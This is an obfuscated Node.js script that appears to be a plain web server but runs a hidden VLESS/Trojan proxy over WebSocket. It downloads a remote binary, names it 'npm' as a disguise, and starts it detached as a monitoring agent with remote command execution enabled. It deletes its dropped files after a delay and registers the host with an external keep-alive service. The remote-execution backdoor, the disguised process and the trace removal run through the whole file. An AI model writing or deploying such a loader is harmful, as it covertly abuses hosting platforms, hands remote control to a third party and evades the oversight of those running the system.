const _0x1d1704=_0x2eb9;(function(_0x422380,_0x1acdf2){const _0x18817d=_0x2eb9,_0x2145af=_0x422380();while(!![]){try{const _0xca3e4=-parseInt(_0x18817d(0xb8))/0x1+parseInt(_0x18817d(0x10a))/0x2*(parseInt(_0x18817d(0xd7))/0x3)+-parseInt(_0x18817d(0xec))/0x4*(parseInt(_0x18817d(0xe9))/0x5)+-parseInt(_0x18817d(0xb6))/0x6*(parseInt(_0x18817d(0xcc))/0x7)+parseInt(_0x18817d(0x11c))/0x8*(parseInt(_0x18817d(0x10e))/0x9)+-parseInt(_0x18817d(0xf8))/0xa+parseInt(_0x18817d(0x130))/0xb;if(_0xca3e4===_0x1acdf2)break;else _0x2145af['push'](_0x2145af['shift']());}catch(_0x54f16e){_0x2145af['push'](_0x2145af['shift']());}}}(_0x2e73,0x726e8));const os=require('os'),http=require(_0x1d1704(0xdf)),fs=require('fs'),axios=require(_0x1d1704(0xe3)),net=require(_0x1d1704(0x117)),path=require(_0x1d1704(0xce)),crypto=require('crypto'),{Buffer}=require('buffer'),{exec,execSync}=require(_0x1d1704(0x126)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x1d1704(0x112)][_0x1d1704(0x110)]||_0x1d1704(0x109),NEZHA_SERVER=process[_0x1d1704(0x112)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x1d1704(0x112)][_0x1d1704(0xe8)]||'',NEZHA_KEY=process[_0x1d1704(0x112)][_0x1d1704(0x10c)]||'',DOMAIN=process['env']['DOMAIN']||_0x1d1704(0xc5),AUTO_ACCESS=process[_0x1d1704(0x112)][_0x1d1704(0xc7)]||!![],WSPATH=process[_0x1d1704(0x112)]['WSPATH']||UUID['slice'](0x0,0x8),SUB_PATH=process['env'][_0x1d1704(0xda)]||_0x1d1704(0xd5),NAME=process[_0x1d1704(0x112)]['NAME']||'',PORT=process[_0x1d1704(0x112)]['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{const _0x230d78=_0x1d1704;try{const _0x8be293=await axios['get']('https://api.ip.sb/geoip'),_0x9ba460=_0x8be293[_0x230d78(0xee)];ISP=(_0x9ba460[_0x230d78(0xc0)]+'-'+_0x9ba460[_0x230d78(0xeb)])[_0x230d78(0xde)](/ /g,'_');}catch(_0x4f20ba){ISP=_0x230d78(0x105);}};GetISP();const httpServer=http[_0x1d1704(0x115)]((_0x4018b4,_0x4c022f)=>{const _0x1b04dc=_0x1d1704;if(_0x4018b4[_0x1b04dc(0xbf)]==='/'){const _0x4e270c=path[_0x1b04dc(0xdd)](__dirname,_0x1b04dc(0x114));fs[_0x1b04dc(0x11e)](_0x4e270c,_0x1b04dc(0xf2),(_0x5bf076,_0x5d0197)=>{const _0x247c35=_0x1b04dc;if(_0x5bf076){_0x4c022f[_0x247c35(0x12e)](0xc8,{'Content-Type':_0x247c35(0xca)}),_0x4c022f[_0x247c35(0x116)](_0x247c35(0xef));return;}_0x4c022f['writeHead'](0xc8,{'Content-Type':_0x247c35(0xca)}),_0x4c022f[_0x247c35(0x116)](_0x5d0197);});return;}else{if(_0x4018b4['url']==='/'+SUB_PATH){const _0x5d7e4a=NAME?NAME+'-'+ISP:ISP,_0x3ae1ba=_0x1b04dc(0xe6)+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+_0x1b04dc(0xf0)+DOMAIN+_0x1b04dc(0xff)+WSPATH+'#'+_0x5d7e4a,_0x36ba4f='trojan://'+UUID+'@'+DOMAIN+_0x1b04dc(0x120)+DOMAIN+_0x1b04dc(0xf0)+DOMAIN+_0x1b04dc(0xff)+WSPATH+'#'+_0x5d7e4a,_0x29fad0=_0x3ae1ba+'\x0a'+_0x36ba4f,_0x55fca3=Buffer[_0x1b04dc(0x122)](_0x29fad0)[_0x1b04dc(0xcb)](_0x1b04dc(0x107));_0x4c022f[_0x1b04dc(0x12e)](0xc8,{'Content-Type':_0x1b04dc(0xe4)}),_0x4c022f['end'](_0x55fca3+'\x0a');}else _0x4c022f[_0x1b04dc(0x12e)](0x194,{'Content-Type':_0x1b04dc(0xe4)}),_0x4c022f[_0x1b04dc(0x116)](_0x1b04dc(0x12a));}}),wss=new WebSocket[(_0x1d1704(0x12b))]({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=[_0x1d1704(0xd4),'1.1.1.1'];function _0x2eb9(_0x239b4a,_0x5695d2){_0x239b4a=_0x239b4a-0xb5;const _0x2e73e4=_0x2e73();let _0x2eb986=_0x2e73e4[_0x239b4a];return _0x2eb986;}function resolveHost(_0x1cb0f7){return new Promise((_0x9b821e,_0x2dbb8c)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x1cb0f7)){_0x9b821e(_0x1cb0f7);return;}let _0x581ccd=0x0;function _0x26f6ec(){const _0x380daa=_0x2eb9;if(_0x581ccd>=DNS_SERVERS['length']){_0x2dbb8c(new Error(_0x380daa(0xd0)+_0x1cb0f7+_0x380daa(0xf5)));return;}const _0x538d6c=DNS_SERVERS[_0x581ccd];_0x581ccd++;const _0x2100a4='https://dns.google/resolve?name='+encodeURIComponent(_0x1cb0f7)+_0x380daa(0xed);axios['get'](_0x2100a4,{'timeout':0x1388,'headers':{'Accept':_0x380daa(0x125)}})['then'](_0x392a37=>{const _0x1110d9=_0x380daa,_0x436a6a=_0x392a37[_0x1110d9(0xee)];if(_0x436a6a[_0x1110d9(0x111)]===0x0&&_0x436a6a[_0x1110d9(0xdb)]&&_0x436a6a[_0x1110d9(0xdb)][_0x1110d9(0xbc)]>0x0){const _0x3e9625=_0x436a6a[_0x1110d9(0xdb)][_0x1110d9(0x11b)](_0x4c30eb=>_0x4c30eb[_0x1110d9(0x12c)]===0x1);if(_0x3e9625){_0x9b821e(_0x3e9625['data']);return;}}_0x26f6ec();})[_0x380daa(0x118)](_0x1c0a85=>{_0x26f6ec();});}_0x26f6ec();});}function handleVlessConnection(_0x537d77,_0x238913){const _0x5c90d9=_0x1d1704,[_0x5806d5]=_0x238913,_0x1a70ce=_0x238913[_0x5c90d9(0xc1)](0x1,0x11);if(!_0x1a70ce['every']((_0x258f59,_0x5e92e7)=>_0x258f59==parseInt(uuid['substr'](_0x5e92e7*0x2,0x2),0x10)))return![];let _0x342d26=_0x238913[_0x5c90d9(0xc1)](0x11,0x12)[_0x5c90d9(0xd6)]()+0x13;const _0x4d5ac6=_0x238913[_0x5c90d9(0xc1)](_0x342d26,_0x342d26+=0x2)[_0x5c90d9(0xb9)](0x0),_0x1ff7ca=_0x238913[_0x5c90d9(0xc1)](_0x342d26,_0x342d26+=0x1)[_0x5c90d9(0xd6)](),_0x255407=_0x1ff7ca==0x1?_0x238913[_0x5c90d9(0xc1)](_0x342d26,_0x342d26+=0x4)[_0x5c90d9(0xdd)]('.'):_0x1ff7ca==0x2?new TextDecoder()[_0x5c90d9(0xb7)](_0x238913[_0x5c90d9(0xc1)](_0x342d26+0x1,_0x342d26+=0x1+_0x238913[_0x5c90d9(0xc1)](_0x342d26,_0x342d26+0x1)[_0x5c90d9(0xd6)]())):_0x1ff7ca==0x3?_0x238913[_0x5c90d9(0xc1)](_0x342d26,_0x342d26+=0x10)[_0x5c90d9(0xbe)]((_0x58c50b,_0x12c978,_0x26beff,_0x516c83)=>_0x26beff%0x2?_0x58c50b[_0x5c90d9(0x12d)](_0x516c83[_0x5c90d9(0xc1)](_0x26beff-0x1,_0x26beff+0x1)):_0x58c50b,[])[_0x5c90d9(0xc2)](_0x5e86a0=>_0x5e86a0['readUInt16BE'](0x0)['toString'](0x10))[_0x5c90d9(0xdd)](':'):'';_0x537d77['send'](new Uint8Array([_0x5806d5,0x0]));const _0x2a16f9=createWebSocketStream(_0x537d77);return resolveHost(_0x255407)[_0x5c90d9(0x103)](_0x1ee84c=>{const _0x357372=_0x5c90d9;net[_0x357372(0x10d)]({'host':_0x1ee84c,'port':_0x4d5ac6},function(){const _0x327367=_0x357372;this[_0x327367(0xbb)](_0x238913['slice'](_0x342d26)),_0x2a16f9['on']('error',()=>{})[_0x327367(0xc6)](this)['on'](_0x327367(0xd2),()=>{})[_0x327367(0xc6)](_0x2a16f9);})['on'](_0x357372(0xd2),()=>{});})[_0x5c90d9(0x118)](_0x239479=>{const _0x4c9923=_0x5c90d9;net['connect']({'host':_0x255407,'port':_0x4d5ac6},function(){const _0x31557f=_0x2eb9;this['write'](_0x238913[_0x31557f(0xc1)](_0x342d26)),_0x2a16f9['on'](_0x31557f(0xd2),()=>{})[_0x31557f(0xc6)](this)['on']('error',()=>{})[_0x31557f(0xc6)](_0x2a16f9);})['on'](_0x4c9923(0xd2),()=>{});}),!![];}function handleTrojanConnection(_0xc999cb,_0xbaf964){const _0x3ac92b=_0x1d1704;try{if(_0xbaf964[_0x3ac92b(0xbc)]<0x3a)return![];const _0xb2c963=_0xbaf964[_0x3ac92b(0xc1)](0x0,0x38)['toString'](),_0x306338=[UUID];let _0x5e3634=null;for(const _0x397276 of _0x306338){const _0x9aff5=crypto['createHash'](_0x3ac92b(0xc4))[_0x3ac92b(0x11f)](_0x397276)[_0x3ac92b(0xe2)](_0x3ac92b(0xd3));if(_0x9aff5===_0xb2c963){_0x5e3634=_0x397276;break;}}if(!_0x5e3634)return![];let _0x2f8ab9=0x38;_0xbaf964[_0x2f8ab9]===0xd&&_0xbaf964[_0x2f8ab9+0x1]===0xa&&(_0x2f8ab9+=0x2);const _0x1823d0=_0xbaf964[_0x2f8ab9];if(_0x1823d0!==0x1)return![];_0x2f8ab9+=0x1;const _0x337d96=_0xbaf964[_0x2f8ab9];_0x2f8ab9+=0x1;let _0x20efa6,_0xbcc49d;if(_0x337d96===0x1)_0x20efa6=_0xbaf964[_0x3ac92b(0xc1)](_0x2f8ab9,_0x2f8ab9+0x4)[_0x3ac92b(0xdd)]('.'),_0x2f8ab9+=0x4;else{if(_0x337d96===0x3){const _0x45c8c6=_0xbaf964[_0x2f8ab9];_0x2f8ab9+=0x1,_0x20efa6=_0xbaf964[_0x3ac92b(0xc1)](_0x2f8ab9,_0x2f8ab9+_0x45c8c6)[_0x3ac92b(0xcb)](),_0x2f8ab9+=_0x45c8c6;}else{if(_0x337d96===0x4)_0x20efa6=_0xbaf964[_0x3ac92b(0xc1)](_0x2f8ab9,_0x2f8ab9+0x10)[_0x3ac92b(0xbe)]((_0x3cdaf3,_0x120327,_0xb26f13,_0x999972)=>_0xb26f13%0x2?_0x3cdaf3[_0x3ac92b(0x12d)](_0x999972[_0x3ac92b(0xc1)](_0xb26f13-0x1,_0xb26f13+0x1)):_0x3cdaf3,[])[_0x3ac92b(0xc2)](_0x187def=>_0x187def[_0x3ac92b(0xb9)](0x0)[_0x3ac92b(0xcb)](0x10))[_0x3ac92b(0xdd)](':'),_0x2f8ab9+=0x10;else return![];}}_0xbcc49d=_0xbaf964[_0x3ac92b(0xb9)](_0x2f8ab9),_0x2f8ab9+=0x2;_0x2f8ab9<_0xbaf964[_0x3ac92b(0xbc)]&&_0xbaf964[_0x2f8ab9]===0xd&&_0xbaf964[_0x2f8ab9+0x1]===0xa&&(_0x2f8ab9+=0x2);const _0x2665e=createWebSocketStream(_0xc999cb);return resolveHost(_0x20efa6)['then'](_0x411a8b=>{const _0x5c9321=_0x3ac92b;net[_0x5c9321(0x10d)]({'host':_0x411a8b,'port':_0xbcc49d},function(){const _0x98f334=_0x5c9321;_0x2f8ab9<_0xbaf964[_0x98f334(0xbc)]&&this[_0x98f334(0xbb)](_0xbaf964['slice'](_0x2f8ab9)),_0x2665e['on'](_0x98f334(0xd2),()=>{})['pipe'](this)['on'](_0x98f334(0xd2),()=>{})[_0x98f334(0xc6)](_0x2665e);})['on'](_0x5c9321(0xd2),()=>{});})['catch'](_0x5ca2b1=>{const _0x1372a5=_0x3ac92b;net[_0x1372a5(0x10d)]({'host':_0x20efa6,'port':_0xbcc49d},function(){const _0x168e99=_0x1372a5;_0x2f8ab9<_0xbaf964['length']&&this[_0x168e99(0xbb)](_0xbaf964['slice'](_0x2f8ab9)),_0x2665e['on'](_0x168e99(0xd2),()=>{})['pipe'](this)['on'](_0x168e99(0xd2),()=>{})[_0x168e99(0xc6)](_0x2665e);})['on'](_0x1372a5(0xd2),()=>{});}),!![];}catch(_0x26b944){return![];}}wss['on'](_0x1d1704(0xcd),(_0x2959ed,_0xc838cd)=>{const _0x20f555=_0x1d1704,_0x5e28d2=_0xc838cd['url']||'';_0x2959ed[_0x20f555(0xc3)](_0x20f555(0xe0),_0x38c20e=>{const _0x1b32ee=_0x20f555;if(_0x38c20e[_0x1b32ee(0xbc)]>0x11&&_0x38c20e[0x0]===0x0){const _0x3da766=_0x38c20e[_0x1b32ee(0xc1)](0x1,0x11),_0x372944=_0x3da766[_0x1b32ee(0x101)]((_0x25710f,_0x5101e8)=>_0x25710f==parseInt(uuid[_0x1b32ee(0x102)](_0x5101e8*0x2,0x2),0x10));if(_0x372944){!handleVlessConnection(_0x2959ed,_0x38c20e)&&_0x2959ed[_0x1b32ee(0xd9)]();return;}}!handleTrojanConnection(_0x2959ed,_0x38c20e)&&_0x2959ed['close']();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x18149a=_0x1d1704,_0x3bb96b=os[_0x18149a(0x113)]();return _0x3bb96b===_0x18149a(0x129)||_0x3bb96b===_0x18149a(0xe7)||_0x3bb96b===_0x18149a(0x121)?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0x18149a(0x119):!NEZHA_PORT?_0x18149a(0xfc):_0x18149a(0x10b);},downloadFile=async()=>{const _0x20e1cd=_0x1d1704;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x47f742=getDownloadUrl(),_0x383d3c=await axios({'method':_0x20e1cd(0xd1),'url':_0x47f742,'responseType':_0x20e1cd(0x10f)}),_0xb1b341=fs['createWriteStream'](_0x20e1cd(0xbd));return _0x383d3c[_0x20e1cd(0xee)][_0x20e1cd(0xc6)](_0xb1b341),new Promise((_0x4bc410,_0x3770dc)=>{const _0x30e7fe=_0x20e1cd;_0xb1b341['on']('finish',()=>{const _0x47d26c=_0x2eb9;console[_0x47d26c(0xf7)](_0x47d26c(0x124)),exec(_0x47d26c(0x131),_0x2fc019=>{if(_0x2fc019)_0x3770dc(_0x2fc019);_0x4bc410();});}),_0xb1b341['on'](_0x30e7fe(0xd2),_0x3770dc);});}catch(_0x421dd1){throw _0x421dd1;}},runnz=async()=>{const _0x47769b=_0x1d1704;try{const _0x1c518b=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x47769b(0xe1)});if(_0x1c518b[_0x47769b(0xf3)]()!==''){console[_0x47769b(0xf7)](_0x47769b(0x104));return;}}catch(_0x2101b4){}await downloadFile();let _0x1e4f80='',_0x3a049b=[_0x47769b(0x100),_0x47769b(0xc8),_0x47769b(0xd8),_0x47769b(0xb5),_0x47769b(0xc9),_0x47769b(0xf4)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x51afce=_0x3a049b['includes'](NEZHA_PORT)?_0x47769b(0x11d):'';_0x1e4f80='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x47769b(0x132)+NEZHA_KEY+'\x20'+_0x51afce+_0x47769b(0x108);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2f64fb=NEZHA_SERVER[_0x47769b(0xfb)](':')?NEZHA_SERVER[_0x47769b(0xe5)](':')['pop']():'',_0xc088d=_0x3a049b[_0x47769b(0xfb)](_0x2f64fb)?'true':_0x47769b(0xfd),_0x1da83a=_0x47769b(0xcf)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x47769b(0xf9)+_0xc088d+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs['writeFileSync'](_0x47769b(0xfa),_0x1da83a);}_0x1e4f80=_0x47769b(0x12f);}else{console[_0x47769b(0xf7)](_0x47769b(0x106));return;}}try{exec(_0x1e4f80,{'shell':'/bin/bash'},_0x3b60d6=>{const _0x1c2d10=_0x47769b;if(_0x3b60d6)console[_0x1c2d10(0xd2)](_0x1c2d10(0x123),_0x3b60d6);else console['log'](_0x1c2d10(0xea));});}catch(_0x1fd03f){console[_0x47769b(0xd2)](_0x47769b(0x127)+_0x1fd03f);}};async function addAccessTask(){const _0x516cd7=_0x1d1704;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x5d8d2c=_0x516cd7(0xf1)+DOMAIN;try{const _0x51da79=await axios[_0x516cd7(0xf6)]('https://oooo.serv00.net/add-url',{'url':_0x5d8d2c},{'headers':{'Content-Type':_0x516cd7(0xba)}});console[_0x516cd7(0xf7)](_0x516cd7(0xdc));}catch(_0xbde70d){}}function _0x2e73(){const _0x13ec54=['vless://','arm64','NEZHA_PORT','7550pyvlqG','npm\x20is\x20running','isp','112NUCRut','&type=A','data','Hello\x20world!','&fp=chrome&type=ws&host=','https://','utf8','trim','2053','\x20with\x20all\x20DNS\x20servers','post','log','7696120JcenGE','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','config.yaml','includes','https://amd64.ssss.nyc.mn/v1','false','Server\x20is\x20running\x20on\x20port\x20','&path=%2F','443','every','substr','then','npm\x20is\x20already\x20running,\x20skip\x20running...','Unknown','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','base64','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','0cd918c4-670f-4af4-bffe-29d2db5c1f07','498926ONlUhV','https://amd64.ssss.nyc.mn/agent','NEZHA_KEY','connect','629334HfmCDV','stream','UUID','Status','env','arch','index.html','createServer','end','net','catch','https://arm64.ssss.nyc.mn/agent','unlink','find','8kLDlRf','--tls','readFile','update',':443?security=tls&sni=','aarch64','from','npm\x20running\x20error:','npm\x20download\x20successfully','application/dns-json','child_process','error:\x20','listen','arm','Not\x20Found\x0a','Server','type','concat','writeHead','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','15859096TlIigY','chmod\x20+x\x20npm','\x20-p\x20','2087','852JSyETD','decode','85415JJrJEs','readUInt16BE','application/json','write','length','npm','reduce','url','country_code','slice','map','once','sha224','https://gvqyhg-mys.hf.space','pipe','AUTO_ACCESS','8443','2083','text/html','toString','44072sHOCft','connection','path','client_secret:\x20','Failed\x20to\x20resolve\x20','get','error','hex','8.8.4.4','sub','readUInt8','9riwAaI','2096','close','SUB_PATH','Answer','Automatic\x20Access\x20Task\x20added\x20successfully','join','replace','http','message','utf-8','digest','axios','text/plain','split'];_0x2e73=function(){return _0x13ec54;};return _0x2e73();}const delFiles=()=>{const _0x5c8740=_0x1d1704;fs[_0x5c8740(0x11a)](_0x5c8740(0xbd),()=>{}),fs[_0x5c8740(0x11a)]('config.yaml',()=>{});};httpServer[_0x1d1704(0x128)](PORT,()=>{const _0x29ab7d=_0x1d1704;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x29ab7d(0xf7)](_0x29ab7d(0xfe)+PORT);});
